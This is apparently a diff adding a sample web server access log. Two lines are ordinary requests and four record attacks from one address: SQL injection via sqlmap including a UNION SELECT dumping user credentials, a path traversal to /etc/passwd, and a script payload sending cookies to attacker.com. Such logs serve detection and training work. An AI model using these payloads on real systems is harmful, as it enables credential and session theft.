@@ -1,0 +1,6 @@
+192.168.1.50 - - [11/Sep/2026:10:14:20 +0000] "GET /index.html HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.50 - - [11/Sep/2026:10:14:25 +0000] "GET /products.php?category=electronics HTTP/1.1" 200 8912 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+203.0.113.88 - - [11/Sep/2026:10:15:02 +0000] "GET /products.php?category=electronics' OR '1'='1 HTTP/1.1" 200 15230 "-" "sqlmap/1.7#stable"
+203.0.113.88 - - [11/Sep/2026:10:15:05 +0000] "GET /products.php?category=1 UNION SELECT null,username,password,email FROM users-- HTTP/1.1" 200 18450 "-" "sqlmap/1.7#stable"
+203.0.113.88 - - [11/Sep/2026:10:15:15 +0000] "GET /view.php?page=../../../../etc/passwd HTTP/1.1" 200 2400 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+203.0.113.88 - - [11/Sep/2026:10:15:30 +0000] "POST /comment.php HTTP/1.1" 200 512 "http://example.com/comment" "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
